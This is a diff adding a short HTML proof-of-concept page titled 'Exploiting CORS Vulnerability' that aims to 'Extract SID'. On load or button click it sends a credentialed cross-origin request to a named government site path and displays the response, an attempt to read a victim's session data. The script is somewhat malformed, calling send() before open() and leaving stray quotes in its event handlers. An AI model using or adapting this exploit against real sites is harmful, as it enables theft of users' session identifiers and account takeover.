@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+<head>
+<script>
+function cors_exploit() {
+	var xhttp = new XMLHttpRequest();
+	xhttp.onreadystatechange = function() {
+	if (this.readyState == 4 && this.status == 200) {
+		document.getElementById("demo").innerHTML = alert(this.responseText);
+		}
+};
+
+xhttp.send();
+xhttp.open("GET", "https://search.epa.gov/admin/bundle.js?0deebbf6765bdff777ec", true);
+xhttp.withCredentials = true;
+xhttp.send();
+}
+</script>
+</head>
+<body onload=cors_exploit()">
+<center>
+<h2>Exploiting CORS Vulnerability </h2>
+<h3>Extract SID</h3><div id=cors>
+<button type="button" onclick=cors_exploit()">Exploit</button>
+</div>
+</body>
+</html>
